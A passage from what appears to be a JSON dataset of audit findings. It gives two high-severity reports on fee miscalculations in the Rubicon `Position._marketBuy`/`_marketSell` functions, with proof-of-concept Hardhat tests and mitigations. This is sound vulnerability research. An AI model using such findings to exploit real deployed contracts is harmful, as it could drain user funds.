        "poc": "## Proof of Concept\nFirst, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nSecond, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624942 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);\n      });\n```\n\nThird, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        /** @audit consider maker fee for POC purpose */\n        if (rubiconMarket.makerFee() > 0) {\n            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;\n        }\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nFourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5622129 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);\n\n        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee\n        expect(5622129).to.be.lt(5624942);\n      });\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nWhen the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        // taker pay maker 0_0\n        if (makerFee() > 0) {\n            uint256 mFee = mul(spend, makerFee()) / 100_000;\n\n            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n                require(\n                    _offer.buy_gem.transferFrom(\n                        msg.sender,\n                        _offer.recipient,\n                        mFee\n                    ),\n                    \"Insufficient funds to cover fee\"\n                );\n            } else {\n                require(\n                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n                    \"Insufficient funds to cover fee\"\n                );\n            }\n\n            ...\n        }\n        ...\n    }\n```\n\nSince the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.\n\n## Proof of Concept\nFirst, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nSecond, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624942 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624942);\n      });\n```\n\nThird, please update the `Position._marketBuy` function again as follows to include the maker fee in `_fee` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        /** @audit consider maker fee for POC purpose */\n        if (rubiconMarket.makerFee() > 0) {\n            _fee += mul(_maxFill, rubiconMarket.makerFee()) / 100_000;\n        }\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nFourth, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function includes the maker fee in `_fee`. This test also demonstrates that the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 and also considers maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await rubiconMarket.setMakerFee(fee);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5622129 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5622129);\n\n        // owner receives less asset tokens in this situation than when Position._marketBuy function does not consider maker fee\n        expect(5622129).to.be.lt(5624942);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to include the maker fee in `_fee` when `rubiconMarket.makerFee() > 0` is true.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 903,
      "page_start": null,
      "heading": "903. Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations",
      "heading_cleaned": "Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n        ...\n    }\n```\n\nBecause the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that she or he is entitled to.\n\n## Proof of Concept\nFirst, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624437 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);\n      });\n```\n\nSecond, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nThird, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5624943 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);\n\n        // owner receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000\n        expect(5624943).to.be.gt(5624437);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n        ...\n    }\n```\n\nBecause the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that she or he is entitled to.\n\n## Proof of Concept\nFirst, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in 